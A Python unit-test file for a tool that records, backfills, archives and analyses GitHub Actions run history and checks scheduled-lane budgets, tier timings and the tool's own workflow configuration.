    def test_invalid_record_counts_as_missing(self) -> None:
        run = self.world.add(run_obj(351, created="2026-03-10T00:00:00Z"))
        self.world.descendants |= {SHA}
        bad = {**self.full(run), "schema": 2}
        self.h.commit_files({"runs/ci/351.json": ci_history.encode(bad)}, "bad")
        self.assertEqual(len(self.check()), 1)
        self.assertEqual(self.h.invalid, ["runs/ci/351.json"])
        self.h.commit_files({"runs/ci/351.json": b"{not json"}, "worse")
        self.assertEqual(len(self.check()), 1)
        # a record of another run under this run's name
        self.h.commit_files(
            {"runs/ci/351.json": ci_history.encode(self.full(run_obj(999)))}, "wrong id"
        )
        self.assertEqual(len(self.check()), 1)

    def test_month_windows(self) -> None:
        wins = list(ci_history._months(datetime(2025, 12, 20).date(),
                                       datetime(2026, 2, 3).date()))
        self.assertEqual([(a.isoformat(), b.isoformat()) for a, b in wins], [
            ("2026-02-01", "2026-02-03"), ("2026-01-01", "2026-01-31"),
            ("2025-12-20", "2025-12-31"),
        ])


class TestBackfill(GitIsolated):
    def setUp(self) -> None:
        super().setUp()
        self.world = ApiWorld()
        self.h = self.history()

    def backfill(self, limit: int = 200) -> tuple[int, int]:
        return ci_history.backfill(self.world.api(), REPO, self.h, limit, now=NOW)

    def test_backfill_writes_missing(self) -> None:
        self.world.add(run_obj(401, created="2025-12-01T00:00:00Z"))  # before the landing
        self.world.add(run_obj(402, created="2026-03-10T00:00:00Z"))
        self.world.add(run_obj(403, event="pull_request", created="2026-03-10T00:00:00Z"))
        held = self.world.add(run_obj(404, created="2026-04-01T00:00:00Z"))
        self.h.commit_files({"runs/ci/404.json": ci_history.encode(
            ci_history.tombstone(held, "ci", "kept"))}, "held")
        self.assertEqual(self.backfill(), (2, 0))
        self.assertEqual(self.remote_files(),
                         {"runs/ci/401.json", "runs/ci/402.json", "runs/ci/404.json"})
        self.assertEqual(self.remote_show("runs/ci/404.json")["tombstone"], "kept")
        self.assertEqual(len(self.remote_show("runs/ci/402.json")["jobs"]), 2)
        msg = self.gitrun("log", "-1", "--format=%s", "ci-history", cwd=self.remote)
        self.assertEqual(msg, "backfill ci: 2 records, 0 tombstones")
        self.assertEqual(self.backfill(), (0, 0))

    def test_backfill_tombstone_when_jobs_gone(self) -> None:
        self.world.add(run_obj(411, created="2026-03-10T00:00:00Z"),
                       ApiError("jobs", 404, "Not Found (HTTP 404)"))
        self.world.add(run_obj(412, created="2026-03-11T00:00:00Z"),
                       ApiError("jobs", 410, "Gone (HTTP 410)"))
        self.world.add(run_obj(413, created="2026-03-12T00:00:00Z"), [])
        self.assertEqual(self.backfill(), (0, 3))
        for rid, reason in ((411, "404"), (412, "410"), (413, "no jobs")):
            rec = self.remote_show(f"runs/ci/{rid}.json")
            self.assertEqual(rec["jobs"], [])
            self.assertIn(reason, rec["tombstone"])
            self.assertEqual(rec["head_sha"], SHA)
        # any other API failure is an error, not a tombstone
        self.world.add(run_obj(414, created="2026-03-13T00:00:00Z"),
                       ApiError("jobs", 502, "Bad Gateway (HTTP 502)"))
        with self.assertRaises(ApiError):
            self.backfill()

    def test_backfill_skips_archived(self) -> None:
        self.world.add(run_obj(421, created="2026-03-10T00:00:00Z"))
        index = {"schema": 1, "archives": [{
            "year": 2025, "tag": "ci-history-2025", "asset": "ci-history-2025.tar.zst",
            "sha256": "0" * 64, "runs": {"ci": [421]},
        }]}
        self.h.commit_files({"archives.json": json.dumps(index).encode()}, "index")
        self.assertEqual(self.backfill(), (0, 0))
        self.assertNotIn("runs/ci/421.json", self.remote_files())

    def test_backfill_limit(self) -> None:
        for i in range(5):
            self.world.add(run_obj(430 + i, created=f"2026-03-1{i}T00:00:00Z"))
        self.assertEqual(self.backfill(limit=2), (2, 0))
        # newest first
        self.assertEqual(self.remote_files(), {"runs/ci/434.json", "runs/ci/433.json"})
        self.assertEqual(self.backfill(limit=2), (2, 0))
        self.assertEqual(self.backfill(limit=2), (1, 0))


class TestSeries(GitIsolated):
    def setUp(self) -> None:
        super().setUp()
        self.h = self.history()
        files = {}
        for rid, (build, extra, event, branch) in enumerate([
            (100, 10, "push", "main"),
            (120, 20, "push", "main"),
            (200, 5, "workflow_dispatch", "main"),
            (999, 0, "pull_request", "main"),
            (999, 0, "push", "topic"),
        ], start=501):
            t0 = f"2026-03-0{rid - 500}T10:00:00Z"
            job = {
                "name": "tier (x86_64, e2e-1)", "conclusion": "success",
                "created": t0, "started": plus(t0, 30), "completed": plus(t0, 30 + build + extra),
                "seconds": build + extra,
                "steps": [{"name": "make", "seconds": build}, {"name": "upload", "seconds": extra},
                          {"name": "make", "seconds": 1}, {"name": "skipped", "seconds": None}],
            }
            chk = {"name": "check", "conclusion": "success", "created": plus(t0, 5),
                   "started": plus(t0, 6), "completed": plus(t0, 60), "seconds": 54, "steps": []}
            rec = {**ci_history.run_fields(run_obj(rid, event=event, branch=branch,
                                                   created=t0), "ci"),
                   "finished": plus(t0, 30 + build + extra), "jobs": [job, chk]}
            files[ci_history.record_path("ci", rid)] = ci_history.encode(rec)
        files["runs/ci/506.json"] = ci_history.encode(
            ci_history.tombstone(run_obj(506), "ci", "gone"))
        self.h.commit_files(files, "series")

    def test_step_series_and_median(self) -> None:
        pts = ci_history.series(self.h, "ci", "tier (x86_64, e2e-1)", "make")
        self.assertEqual([p.run_id for p in pts], [501, 502, 503])
        self.assertEqual([p.seconds for p in pts], [101, 121, 201])  # same-named steps summed
        self.assertEqual(pts[0].head_sha, SHA)
        # the job's own seconds, found by slug too
        pts = ci_history.series(self.h, "ci", "Tier x86_64 e2e 1")
        self.assertEqual([p.seconds for p in pts], [110, 140, 205])
        # any branch, any event
        pts = ci_history.series(self.h, "ci", "check", None, None, None)
        self.assertEqual(len(pts), 5)
        # a step no record has
        self.assertEqual(ci_history.series(self.h, "ci", "check", "nope"), [])
        out = io.StringIO()
        with mock.patch("sys.stdout", out):
            ci_history.print_series(ci_history.series(self.h, "ci", "tier (x86_64, e2e-1)",
                                                      "make"))
        lines = out.getvalue().splitlines()
        self.assertEqual(len(lines), 4)
        self.assertEqual(lines[0].split(), ["2026-03-01T10:02:20Z", SHA[:12], "501", "101"])
        self.assertEqual(lines[-1], "median 121 s over 3 runs")

    def test_push_to_green_series(self) -> None:
        pts = ci_history.series(self.h, "ci")
        # the latest job completed minus the earliest job created
        self.assertEqual([p.seconds for p in pts], [140, 170, 235])
        pts = ci_history.series(self.h, "ci", events=frozenset({"push"}))
        self.assertEqual([p.run_id for p in pts], [501, 502])

    def test_main_series(self) -> None:
        out = io.StringIO()
        with mock.patch("sys.stdout", out):
            rc = ci_history.main(["--series", "ci", "--history", str(self.tmp / "m"),
                                  "--remote", str(self.remote)])
        self.assertEqual(rc, 0)
        self.assertEqual(out.getvalue().splitlines()[-1], "median 170 s over 3 runs")
        with mock.patch("sys.stderr", io.StringIO()):
            self.assertEqual(ci_history.main(["--series", "ci", "--step", "make"]), 2)


class FakeCodec:
    def compress(self, data: bytes) -> bytes:
        return b"Z" + data[::-1]

    def decompress(self, data: bytes) -> bytes:
        assert data[:1] == b"Z"
        return data[:0:-1]


class FakeReleaser:
    def __init__(self) -> None:
        self.assets: dict[tuple[str, str], bytes] = {}
        self.created: list[tuple[str, str, str]] = []
        self.on_create: list[Any] = []

    def create(self, tag: str, asset: Path, target: str, notes: str) -> None:
        self.created.append((tag, asset.name, target))
        self.assets[(tag, asset.name)] = asset.read_bytes()
        for hook in self.on_create:
            hook()

    def download(self, tag: str, asset: str, dest: Path) -> Path:
        dest.mkdir(parents=True, exist_ok=True)
        (dest / asset).write_bytes(self.assets[(tag, asset)])
        return dest / asset


class TestArchive(GitIsolated):
    NOW = datetime(2026, 5, 1, tzinfo=UTC)

    def setUp(self) -> None:
        super().setUp()
        self.rel = FakeReleaser()
        self.codec = FakeCodec()
        seed = self.history("seed")
        files: dict[str, bytes] = {}
        for rid, day in ((601, "2024-06-01"), (602, "2024-12-31"), (603, "2025-01-01"),
                         (604, "2026-02-01")):
            rec = ci_history.tombstone(run_obj(rid, created=f"{day}T23:59:00Z"), "ci", "t")
            files[ci_history.record_path("ci", rid)] = ci_history.encode(rec)
        files["records/2024-07-01-host-" + "e" * 12 + ".json"] = b"{}\n"
        seed.commit_files(files, "seed")
        self.tip = self.gitrun("rev-parse", "ci-history", cwd=self.remote)

    def repo(self, name: str) -> HistoryRepo:
        return HistoryRepo(self.tmp / name, str(self.remote), sleep=self.sleeps.append,
                           releaser=self.rel, codec=self.codec)

    def rotate(self, h: HistoryRepo, threshold: int = 0) -> str | None:
        return ci_history.rotate(h, self.rel, self.codec, self.NOW, threshold)

    def test_rotation_moves_oldest_year(self) -> None:
        h = self.repo("rot")
        self.assertEqual(self.rotate(h), "ci-history-2024")
        # the prerelease, tagged at the pre-rotation tip
        self.assertEqual(self.rel.created,
                         [("ci-history-2024", "ci-history-2024.tar.zst", self.tip)])
        # an orphan root holding the rest and the index
        parents = self.gitrun("rev-list", "--parents", "-n1", "ci-history",
                              cwd=self.remote).split()
        self.assertEqual(len(parents), 1)
        self.assertEqual(self.remote_files(),
                         {"runs/ci/603.json", "runs/ci/604.json", "archives.json"})
        index = self.remote_show("archives.json")
        self.assertEqual(index["schema"], 1)
        (entry,) = index["archives"]
        blob = self.rel.assets[("ci-history-2024", "ci-history-2024.tar.zst")]
        self.assertEqual(entry, {
            "year": 2024, "tag": "ci-history-2024", "asset": "ci-history-2024.tar.zst",
            "sha256": hashlib.sha256(blob).hexdigest(), "runs": {"ci": [601, 602]},
        })
        with tarfile.open(fileobj=io.BytesIO(self.codec.decompress(blob))) as tar:
            self.assertEqual(sorted(tar.getnames()), [
                "records/2024-07-01-host-" + "e" * 12 + ".json",
                "runs/ci/601.json", "runs/ci/602.json",
            ])
        # the next year goes next, and the index grows
        self.assertEqual(self.rotate(self.repo("rot2")), "ci-history-2025")
        self.assertEqual([e["year"] for e in self.remote_show("archives.json")["archives"]],
                         [2024, 2025])
        # under the threshold nothing moves
        self.assertIsNone(self.rotate(self.repo("rot3"), threshold=10**12))

    def test_rotation_lease(self) -> None:
        # a record lands between the rotation's read and its push: the lease
        # fails, the rotation starts again, and the record survives
        w = self.history("writer")

        def race() -> None:
            if not self.rel.on_create:
                return
            self.rel.on_create.clear()
            w.commit_files({"runs/ci/700.json": ci_history.encode(
                ci_history.tombstone(run_obj(700, created="2026-04-01T00:00:00Z"), "ci", "t"))},
                "ci run 700")

        self.rel.on_create.append(race)
        h = self.repo("rot")
        self.assertEqual(self.rotate(h), "ci-history-2024")
        self.assertEqual(len(self.rel.created), 1)
        self.assertEqual(self.remote_files(), {"runs/ci/603.json", "runs/ci/604.json",
                                               "runs/ci/700.json", "archives.json"})
        self.assertEqual(len(self.sleeps), 1)

    def test_gh_releaser_argv(self) -> None:
        with mock.patch.object(subprocess, "run") as run:
            run.return_value = subprocess.CompletedProcess([], 0, b"", b"")
            ci_history.GhReleaser(REPO).create("ci-history-2024", Path("a.tar.zst"), SHA, "n")
        argv = run.call_args.args[0]
        self.assertEqual(argv[:4], ["gh", "release", "create", "ci-history-2024"])
        for flag in ("--prerelease", "--latest=false"):
            self.assertIn(flag, argv)
        self.assertEqual(argv[argv.index("--target") + 1], SHA)
        self.assertEqual(argv[argv.index("--repo") + 1], REPO)

    def test_rotation_refuses_current_year(self) -> None:
        with self.assertRaises(HistoryError) as cm:
            ci_history.rotate(self.repo("rot"), self.rel, self.codec,
                              datetime(2024, 8, 1, tzinfo=UTC), 0)
        self.assertIn("current year", str(cm.exception))
        self.assertIn("bytes", str(cm.exception))
        self.assertEqual(self.rel.created, [])
        self.assertEqual(self.gitrun("rev-parse", "ci-history", cwd=self.remote), self.tip)

    def test_reader_reads_branch_and_archive(self) -> None:
        self.rotate(self.repo("rot"))
        r = self.repo("reader")
        r.open()
        self.assertEqual(sorted(x["run_id"] for x in r.records("ci")), [601, 602, 603, 604])
        self.assertEqual(sorted(x["run_id"] for x in r.records()), [601, 602, 603, 604])
        self.assertTrue((self.tmp / "reader/archives/ci-history-2024.tar.zst").is_file())
        self.assertTrue(r.has("ci", 601))
        self.assertTrue(r.has("ci", 604))
        self.assertFalse(r.has("ci", 605))
        self.assertFalse(r.has("release", 601))
        # the downloaded archive is not committed by a later write
        r.commit_files({"runs/ci/800.json": b"{}\n"}, "ci run 800")
        self.assertNotIn("archives/ci-history-2024.tar.zst", self.remote_files())
        # a writer that read the pre-rotation tip does not re-add archived files
        self.assertNotIn("runs/ci/601.json", self.remote_files())

    def test_archive_sha_mismatch_fails(self) -> None:
        self.rotate(self.repo("rot"))
        key = ("ci-history-2024", "ci-history-2024.tar.zst")
        self.rel.assets[key] = self.rel.assets[key] + b"tampered"
        r = self.repo("reader")
        r.open()
        with self.assertRaises(HistoryError) as cm:
            r.records("ci")
        self.assertIn("SHA-256", str(cm.exception))

    def test_packed_bytes(self) -> None:
        h = self.repo("full")
        h.open(depth=None)
        self.assertGreater(h.packed_bytes(), 0)


WORKFLOW = ci_history.ROOT / ".github/workflows/ci-history.yml"


class TestWorkflow(unittest.TestCase):
    def setUp(self) -> None:
        self.text = WORKFLOW.read_text(encoding="utf-8")
        self.wf = check_workflows.parse(self.text, str(WORKFLOW))
        jobs = self.wf.get("jobs")
        assert jobs is not None
        self.jobs = {j.key: j for j in jobs.children}

    def test_permissions(self) -> None:
        top = self.wf.get("permissions")
        assert top is not None
        self.assertEqual([(g.key, g.value) for g in top.children], [("contents", "read")])
        self.assertEqual(set(self.jobs), {"record", "daily"})
        for name, job in self.jobs.items():
            perm = job.get("permissions")
            assert perm is not None, name
            self.assertEqual(
                sorted((g.key, g.value) for g in perm.children),
                [("actions", "read"), ("contents", "write")], name,
            )
            for g in perm.children:
                self.assertTrue(g.comment, f"{name}: {g.key} names no need")
        self.assertEqual(check_workflows.rule_permissions(
            check_workflows.Tree(workflows={str(WORKFLOW): self.wf})), [])

    def test_checks_out_only_history(self) -> None:
        self.assertNotIn("actions/checkout", self.text)
        uses = [n for n in self.wf.walk() if n.key == "uses"]
        self.assertEqual(uses, [])  # no action at all, so none needs a pin
        # the tool clones the one branch into its own work tree
        self.assertEqual(ci_history.BRANCH, "ci-history")
        with mock.patch.dict(os.environ, {"GITHUB_ACTIONS": "true", "RUNNER_TEMP": "/rt",
                                          "GITHUB_REPOSITORY": REPO}):
            self.assertEqual(ci_history.default_workdir(), Path("/rt/ci-history"))
            self.assertEqual(ci_history.default_remote(), f"https://github.com/{REPO}.git")

    def steps(self, job: str) -> list[check_workflows.Node]:
        steps = self.jobs[job].get("steps")
        assert steps is not None
        return steps.items

    def run_text(self, step: check_workflows.Node) -> str:
        run = step.get("run")
        return run.value or "" if run is not None else ""

    def test_tool_from_default_branch(self) -> None:
        for job in ("record", "daily"):
            first = self.run_text(self.steps(job)[0])
            for f in ("ci_history.py", "gatelib.py"):
                self.assertIn(f, first)
            self.assertIn("contents/scripts/$f?ref=$GITHUB_SHA", first)
            self.assertIn('"$RUNNER_TEMP/tool/scripts/$f"', first)
            self.assertIn("gh auth setup-git", first)
            for step in self.steps(job)[1:]:
                self.assertTrue(
                    self.run_text(step).startswith(
                        'python3 "$RUNNER_TEMP/tool/scripts/ci_history.py"'), job)
        # the fetched layout imports gatelib as the tree does
        src = Path(ci_history.__file__).read_text(encoding="utf-8")
        self.assertIn("from scripts import gatelib", src)
        record = [self.run_text(s) for s in self.steps("record")[1:]]
        self.assertEqual(record, [
            'python3 "$RUNNER_TEMP/tool/scripts/ci_history.py" --event "$GITHUB_EVENT_PATH"'])
        daily = [self.run_text(s).split("ci_history.py\"", 1)[1] for s in self.steps("daily")[1:]]
        self.assertEqual(daily, [" --rotate", " --backfill --limit 200", ""])

    def test_no_run_fields_in_yaml(self) -> None:
        self.assertIsNone(re.search(r"workflow_run\.|head_sha|head_branch", self.text))
        for n in self.wf.walk():
            if n.key in ("run", "env") or (n.kind == "scalar" and n.key and n.key.isupper()):
                for v in [n.value or ""] + [c.value or "" for c in n.children]:
                    self.assertNotIn("github.event.", v)
                    self.assertNotIn("inputs.", v)
        for n in self.wf.walk():
            if n.key == "run":
                self.assertNotIn("${{", n.value or "")
        self.assertEqual(check_workflows.rule_no_expr_in_run(
            check_workflows.Tree(workflows={str(WORKFLOW): self.wf})), [])

    def test_triggers(self) -> None:
        on = self.wf.get("on")
        assert on is not None
        wr = on.get("workflow_run")
        assert wr is not None
        workflows, types = wr.get("workflows"), wr.get("types")
        assert workflows is not None and types is not None
        self.assertEqual(workflows.scalars(), sorted(ci_history.WORKFLOWS))
        self.assertEqual(types.scalars(), ["completed"])
        sched = on.get("schedule")
        assert sched is not None
        self.assertEqual([i.get("cron").value for i in sched.items  # type: ignore[union-attr]
                          ], ["23 4 * * *"])
        self.assertIsNotNone(on.get("workflow_dispatch"))
        cond = {k: (j.get("if").value if j.get("if") else None)  # type: ignore[union-attr]
                for k, j in self.jobs.items()}
        self.assertEqual(cond, {"record": "github.event_name == 'workflow_run'",
                                "daily": "github.event_name != 'workflow_run'"})
        for job in self.jobs.values():
            conc = job.get("concurrency")
            assert conc is not None
            # Scheduled lane 6 (DESIGN §8.6), queued, never cancelled.
            self.assertEqual({c.key: c.value for c in conc.children},
                             {"group": "sched-lane-6", "queue": "max"})
            self.assertEqual(job.get("runs-on").value, "ubuntu-26.04")  # type: ignore[union-attr]

    def test_workflow_names_match_files(self) -> None:
        # `workflow_run` matches by name: a rename would silently stop the history
        for key, spec in ci_history.WORKFLOWS.items():
            wf = check_workflows.parse(
                (ci_history.ROOT / spec.path).read_text(encoding="utf-8"), spec.path)
            name = wf.get("name")
            self.assertEqual(name.value if name else None, key, spec.path)
        name = self.wf.get("name")
        self.assertEqual(name.value if name else None, "ci-history")



# --- budget and tiers (ROADMAP §10.1, DESIGN §8.6 Scheduled capacity) --------------

# A Wednesday; the last 4 complete weeks start on the Mondays below.
NOW = datetime(2026, 9, 30, 12, 0, tzinfo=UTC)
W1 = datetime(2026, 9, 21, tzinfo=UTC)  # the latest complete week
W4 = datetime(2026, 8, 31, tzinfo=UTC)  # the oldest
WEEK = timedelta(days=7)
LANES = ci_history.Lanes(
    job_lane={
        ("nightly", "kvm"): "sched-lane-0",
        ("smp-stress", "stress"): "sched-lane-7",
        ("smp-stress", "rebuild"): "sched-lane-8",
    },
    reserved={"sched-lane-0": "nightly", "sched-lane-7": "none", "sched-lane-8": "rebuilds"},
)


def iso(t: datetime) -> str:
    return t.strftime("%Y-%m-%dT%H:%M:%SZ")


def sched_rec(
    workflow: str, job: str, start: datetime, hours: float, wait_h: float = 0.0, run_id: int = 1
) -> dict[str, Any]:
    created = start - timedelta(hours=wait_h)
    return {
        "workflow": workflow, "run_id": run_id, "event": "schedule", "branch": "main",
        "jobs": [{
            "name": job, "created": iso(created), "started": iso(start),
            "completed": iso(start + timedelta(hours=hours)), "steps": [],
        }],
    }


def busy(lane_job: tuple[str, str], share: float, week: datetime = W1) -> list[dict[str, Any]]:
    """Records that keep one lane busy `share` of `week`, in one-day jobs."""
    total = share * 7 * 24
    out, t, i = [], week, 0
    while total > 0:
        h = min(total, 24.0)
        out.append(sched_rec(lane_job[0], lane_job[1], t, h, run_id=100 + i))
        total -= h
        t += timedelta(days=1)
        i += 1
    return out


class Budget(unittest.TestCase):
    def run_budget(
        self, records: list[dict[str, Any]], windows: list[tuple[datetime, datetime]] | None = None
    ) -> list[str]:
        with mock.patch("builtins.print"):
            return ci_history.budget(records, LANES, windows or [], NOW)

    def test_busy_61_percent_fails_59_passes(self) -> None:
        got = self.run_budget(busy(("nightly", "kvm"), 0.61))
        self.assertEqual(len(got), 1)
        self.assertIn("sched-lane-0: busy 61% of the week of 2026-09-21", got[0])
        self.assertEqual(self.run_budget(busy(("nightly", "kvm"), 0.59)), [])

    def test_unreserved_lane_busy_limit_holds_too(self) -> None:
        got = self.run_budget(busy(("smp-stress", "stress"), 0.61, W4))
        self.assertEqual(len(got), 1)
        self.assertIn("sched-lane-7: busy 61% of the week of 2026-08-31", got[0])

    def test_rebuilds_lane_at_90_percent_passes(self) -> None:
        self.assertEqual(self.run_budget(busy(("smp-stress", "rebuild"), 0.90)), [])

    def test_release_window_week_ignored(self) -> None:
        window = (W1 + timedelta(days=2), W1 + timedelta(days=3))
        self.assertEqual(self.run_budget(busy(("nightly", "kvm"), 0.90), [window]), [])
        self.assertEqual(len(self.run_budget(busy(("nightly", "kvm"), 0.90, W4), [window])), 1)

    def test_older_and_current_weeks_ignored(self) -> None:
        old = busy(("nightly", "kvm"), 0.9, W4 - timedelta(days=7))
        now_week = busy(("nightly", "kvm"), 0.9, W1 + timedelta(days=7))
        self.assertEqual(self.run_budget(old + now_week), [])

    def test_reserved_wait_12h1m_fails(self) -> None:
        rec = sched_rec("nightly", "kvm", W1 + timedelta(days=1), 1, wait_h=12 + 1 / 60)
        got = self.run_budget([rec])
        self.assertEqual(len(got), 1)
        self.assertIn("waited 12.0 h to start", got[0])
        ok = sched_rec("nightly", "kvm", W1 + timedelta(days=1), 1, wait_h=12)
        self.assertEqual(self.run_budget([ok]), [])

    def test_unreserved_20h_wait_passes(self) -> None:
        rec = sched_rec("smp-stress", "stress", W1 + timedelta(days=1), 1, wait_h=20)
        self.assertEqual(self.run_budget([rec]), [])

    def test_matrix_leg_takes_its_job_lane(self) -> None:
        recs = busy(("nightly", "kvm (x86_64)"), 0.61)
        self.assertEqual(len(self.run_budget(recs)), 1)

    def test_prints_job_hours_and_waits(self) -> None:
        rec = sched_rec("nightly", "kvm", W1 + timedelta(days=1), 2, wait_h=1)
        older = sched_rec("nightly", "kvm", W4 - timedelta(days=7), 1, run_id=2)
        with mock.patch("builtins.print") as p:
            ci_history.budget([older, rec], LANES, [], NOW)
        text = "\n".join(str(c.args[0]) for c in p.call_args_list)
        self.assertIn("workflow nightly: 0.0, 0.0, 0.0, 2.0 job-hours per week", text)
        self.assertIn("sched-lane-0 (nightly): busy 0%, 0%, 0%, 1%; wait median 1.0 h, max 1.0 h",
                      text)
        self.assertNotIn("not measured", text)

    def test_weeks_before_the_history_not_measured(self) -> None:
        # The history's first scheduled job is in the week of W2: W4 and W3
        # ended before it, so they are named and not measured.
        rec = sched_rec("nightly", "kvm", W1 - timedelta(days=6), 2)
        with mock.patch("builtins.print") as p:
            self.assertEqual(ci_history.budget([rec], LANES, [], NOW), [])
        text = "\n".join(str(c.args[0]) for c in p.call_args_list)
        self.assertIn("budget: weeks from 2026-09-14, 2026-09-21 (Monday", text)
        self.assertIn("weeks from 2026-08-31, 2026-09-07 end before the history's first "
                      "scheduled job (2026-09-15), not measured", text)
        self.assertIn("workflow nightly: 2.0, 0.0 job-hours per week", text)
        # a busy lane in a measured week still fails
        self.assertEqual(len(self.run_budget(busy(("nightly", "kvm"), 0.61, W1 - WEEK))), 1)

    def test_history_younger_than_a_complete_week(self) -> None:
        # Every record is in the current week: no week can be measured yet.
        rec = sched_rec("nightly", "kvm", W1 + WEEK + timedelta(hours=9), 1)
        with self.assertRaises(ci_history.NoHistory) as ctx:
            self.run_budget([rec])
        self.assertIn("first scheduled job (2026-09-28 09:00 UTC)", str(ctx.exception))
        self.assertIn("the first ends 2026-10-05 00:00 UTC", str(ctx.exception))
        # a release window over the one week the history covers is skipped, as before
        window = (W1, W1 + timedelta(days=1))
        self.assertEqual(self.run_budget(busy(("nightly", "kvm"), 0.90), [window]), [])

    def test_missing_times_raise(self) -> None:
        rec = sched_rec("nightly", "kvm", W1, 1)
        rec["jobs"][0]["created"] = None
        with self.assertRaises(ci_history.MissingTimes):
            self.run_budget([rec])

    def test_tombstone_skipped(self) -> None:
        self.assertEqual(self.run_budget([{"workflow": "nightly", "tombstone": "gone"}]), [])


def ci_run(run_id: int, seconds: dict[str, int | None], *, event: str = "push",
           branch: str = "main", finished: str | None = None) -> dict[str, Any]:
    jobs = [
        {"name": "check", "steps": [{"name": "make check", "seconds": 300}]},
        *({"name": name, "steps": [
            {"name": "unpack prebuilt files", "seconds": 5},
            {"name": "make test-kernel", "seconds": s},
        ]} for name, s in seconds.items()),
    ]
    return {
        "workflow": "ci", "run_id": run_id, "event": event, "branch": branch,
        "finished": finished or f"2026-09-{1 + run_id % 28:02d}T00:00:{run_id % 60:02d}Z",
        "jobs": jobs,
    }


class Tiers(unittest.TestCase):
    TIER = "tier (x86_64, in-guest-1)"

    def run_tiers(self, records: list[dict[str, Any]]) -> list[str]:
        with mock.patch("builtins.print"):
            return ci_history.tiers(records)

    def runs(self, value: int, n: int = 20) -> list[dict[str, Any]]:
        return [ci_run(i, {self.TIER: value}, finished=f"2026-09-20T{i:02d}:00:00Z")
                for i in range(n)]

    def test_median_61_fails_59_passes(self) -> None:
        got = self.run_tiers(self.runs(61))
        self.assertEqual(len(got), 1)
        self.assertIn("tier (x86_64, in-guest-1): median QEMU time 61 s over 20 runs", got[0])
        self.assertEqual(self.run_tiers(self.runs(59)), [])

    def test_21st_older_run_ignored(self) -> None:
        old = ci_run(99, {self.TIER: 10_000}, finished="2026-01-01T00:00:00Z")
        self.assertEqual(self.run_tiers([old, *self.runs(59)]), [])

    def test_pull_request_and_other_branch_runs_ignored(self) -> None:
        pr = [ci_run(50 + i, {self.TIER: 500}, event="pull_request") for i in range(20)]
        other = [ci_run(80 + i, {self.TIER: 500}, branch="phase-10") for i in range(20)]
        self.assertEqual(self.run_tiers([*pr, *other, *self.runs(59)]), [])

    def test_tier_missing_from_newest_run_is_retired(self) -> None:
        old = [ci_run(i, {self.TIER: 236}, finished=f"2026-09-10T{i:02d}:00:00Z")
               for i in range(2)]
        new = ci_run(40, {"tier (x86_64, kernel-1)": 50}, finished="2026-09-21T00:00:00Z")
        with mock.patch("builtins.print") as p:
            self.assertEqual(ci_history.tiers([*old, new]), [])
        lines = [c.args[0] for c in p.call_args_list]
        self.assertIn(f"{self.TIER}: retired (not in ci run 40), n=2", lines)
        self.assertIn("tier (x86_64, kernel-1): median 50 s, n=1", lines)
        slow = ci_run(41, {"tier (x86_64, kernel-1)": 70}, finished="2026-09-22T00:00:00Z")
        self.assertEqual(len(self.run_tiers([*old, new, slow, slow | {"run_id": 42}])), 1)

    def test_fewer_runs_prints_n(self) -> None:
        with mock.patch("builtins.print") as p:
            self.assertEqual(ci_history.tiers(self.runs(40, n=3)), [])
        self.assertIn(f"{self.TIER}: median 40 s, n=3", [c.args[0] for c in p.call_args_list])

    def test_steps_summed_and_other_steps_ignored(self) -> None:
        rec = ci_run(1, {})
        rec["jobs"].append({"name": self.TIER, "steps": [
            {"name": "make test-e2e test-e2e-uefi", "seconds": 40},
            {"name": "make test-kernel", "seconds": 30},
            {"name": "harness results summary", "seconds": 900},
        ]})
        got = self.run_tiers([rec])
        self.assertEqual(len(got), 1)
        self.assertIn("median QEMU time 70 s", got[0])

    def test_missing_step_time_raises(self) -> None:
        with self.assertRaises(ci_history.MissingTimes):
            self.run_tiers([ci_run(1, {self.TIER: None})])
        rec = ci_run(1, {})
        rec["jobs"].append({"name": self.TIER, "steps": []})
        with self.assertRaises(ci_history.MissingTimes):
            self.run_tiers([rec])


class ReleaseWindows(unittest.TestCase):
    def test_none_and_pairs(self) -> None:
        self.assertEqual(ci_history.release_windows("x\nRelease windows: none\n"), [])
        got = ci_history.release_windows(
            "Release windows: `2026-09-01T00:00:00Z..2026-09-03T00:00:00Z`\n")
        want = (datetime(2026, 9, 1, tzinfo=UTC), datetime(2026, 9, 3, tzinfo=UTC))
        self.assertEqual(got, [want])

    def test_missing_or_bad_line_fails(self) -> None:
        with self.assertRaises(HistoryError):
            ci_history.release_windows("no line")
        with self.assertRaises(HistoryError):
            ci_history.release_windows("Release windows: soon\n")


class BudgetCli(unittest.TestCase):
    def test_tree_lanes(self) -> None:
        # Every scheduled workflow but ci-history.yml is recorded, so every
        # lane they run in is measured (lane 9 is macos.yml's).
        lanes, keys = ci_history.scheduled_lanes()
        self.assertEqual(sorted(keys), ["macos", "nightly", "smp-stress"])
        self.assertEqual(lanes.lane_of("nightly", "kvm"), "sched-lane-0")
        self.assertEqual(lanes.reserved["sched-lane-0"], "nightly")
        self.assertEqual(lanes.lane_of("macos", "check"), "sched-lane-9")
        self.assertEqual(lanes.lane_of("macos", "test"), "sched-lane-9")

    def test_unrecorded_scheduled_workflow_fails(self) -> None:
        # A scheduled workflow the recorder does not list never gets a
        # record, so --budget would never measure its lanes.
        unlisted = {k: v for k, v in ci_history.WORKFLOWS.items() if k != "macos"}
        with mock.patch.object(ci_history, "WORKFLOWS", unlisted):
            with self.assertRaises(HistoryError) as ctx:
                ci_history.scheduled_lanes()
        self.assertIn(".github/workflows/macos.yml", str(ctx.exception))

    def budget_cli(self, by_workflow: dict[str, list[dict[str, Any]]]) -> tuple[int, str]:
        """`--budget` at `NOW` over these records; its exit status and stderr."""

        class FixedNow(datetime):
            @classmethod
            def now(cls, tz: Any = None) -> FixedNow:
                return cls.fromtimestamp(NOW.timestamp(), tz)

        history = mock.Mock()
        history.records.side_effect = lambda key=None: by_workflow.get(key, [])
        err = io.StringIO()
        with (
            mock.patch.object(ci_history, "HistoryRepo", return_value=history),
            mock.patch.object(ci_history, "datetime", FixedNow),
            mock.patch.dict(os.environ, {"GITHUB_STEP_SUMMARY": ""}),
            contextlib.redirect_stdout(io.StringIO()),
            contextlib.redirect_stderr(err),
        ):
            rc = ci_history.main(["--budget", "--remote", "x"])
        return rc, err.getvalue()

    def first_night(self) -> dict[str, list[dict[str, Any]]]:
        return {"nightly": [sched_rec("nightly", "kvm", W1 + timedelta(days=1), 1)]}

    def test_each_scheduled_workflow_needs_a_record(self) -> None:
        # nightly's first run is recorded; smp-stress (weekly) and macos have
        # not completed one yet.
        rc, err = self.budget_cli(self.first_night())
        self.assertEqual(rc, 2)
        self.assertIn("no recorded run of macos, smp-stress.", err)
